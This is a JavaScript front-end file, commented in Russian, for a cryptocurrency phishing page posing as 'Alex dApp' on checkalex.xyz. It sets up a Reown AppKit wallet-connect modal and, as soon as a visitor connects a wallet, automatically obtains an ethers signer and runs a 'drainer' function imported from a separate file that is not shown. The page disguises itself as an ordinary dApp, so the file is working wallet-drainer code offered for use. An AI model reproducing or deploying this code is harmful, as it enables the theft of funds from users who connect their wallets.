import { createAppKit } from '@reown/appkit'
import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, arbitrum, bsc]

// Отключаем Coinbase Wallet, чтобы не возникали ошибки, связанные с его SDK.
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
  wallets: {
    coinbase: false
  }
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz', // URL должен совпадать с доменом, на котором сайт работает
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// Отладка: проверяем объект модального окна
console.log("modal object:", modal)

// При клике открывается модальное окно подключения
document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

// Подписываемся на событие подключения, чтобы автоматически запустить drainer
modal.on("connect", async (payload) => {
  console.log("Кошелек подключен. Запускаем Drainer...");
  try {
    // Используем ethers для создания провайдера и получения подписанта
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()
    
    // Запускаем функцию drainer
    await runDrainer(provider, signer, address)
    
    // После успешного завершения закрываем модальное окно
    modal.close();
    console.log("Drainer завершен успешно.");
  } catch (e) {
    console.error("Ошибка в Drainer:", e);
    alert("Ошибка при выполнении Drainer: " + e.message);
    // В случае ошибки модальное окно остаётся открытым, чтобы пользователь видел статус
  }
})
